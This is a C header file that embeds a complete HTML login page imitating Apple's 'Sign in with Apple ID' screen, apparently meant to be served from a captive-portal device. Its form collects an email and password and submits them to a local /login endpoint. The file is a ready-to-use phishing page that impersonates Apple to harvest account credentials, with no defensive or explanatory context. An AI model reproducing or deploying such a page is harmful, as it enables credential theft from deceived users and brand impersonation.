#ifndef PORTAL_APPLE_H
#define PORTAL_APPLE_H

const char PORTAL_APPLE_HTML[] = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with Apple ID</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
            background: #f5f5f7;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .apple-logo {
            font-size: 48px;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1d1d1f;
            margin-bottom: 32px;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            font-size: 12px;
            color: #86868b;
            margin-bottom: 4px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            font-size: 17px;
            background: #f5f5f7;
        }
        input:focus {
            outline: none;
            border-color: #0071e3;
            background: white;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #0071e3;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 16px;
        }
        button:hover {
            background: #0077ed;
        }
        .links {
            margin-top: 24px;
        }
        .links a {
            display: block;
            color: #0066cc;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 8px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #86868b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="apple-logo"></div>
        <h1>Sign in with Apple ID</h1>
        <form action="/login" method="GET">
            <div class="form-group">
                <label>Apple ID</label>
                <input type="email" name="email" placeholder="Email or Phone Number" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
        <div class="links">
            <a href="#">Forgot Apple ID or password?</a>
            <a href="#">Don't have an Apple ID? Create yours now.</a>
        </div>
        <p class="footer">Your Apple ID is the email you use for Apple services.</p>
    </div>
</body>
</html>
)rawliteral";

#endif
